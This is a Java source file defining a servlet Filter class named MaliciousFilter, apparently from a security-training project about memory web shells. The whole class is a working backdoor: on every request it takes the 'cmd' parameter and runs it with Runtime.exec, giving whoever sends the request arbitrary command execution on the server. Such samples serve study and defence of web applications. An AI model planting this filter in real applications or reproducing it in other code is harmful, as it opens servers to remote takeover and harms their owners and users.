package top.whgojp.modules.mshell.entity;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

public class MaliciousFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        // 初始化逻辑
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;

        // 获取请求中的 cmd 参数
        String command = httpRequest.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
            try {
                // 执行传入的命令
                executeCommand(command);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        // 继续处理请求
        chain.doFilter(request, response);
    }

    @Override
    public void destroy() {
        // 销毁逻辑
    }

    // 执行任意命令
    private void executeCommand(String command) throws IOException {
        // 执行用户传入的命令
        System.out.println("Executing command: " + command);
        Runtime.getRuntime().exec(command);
    }
}

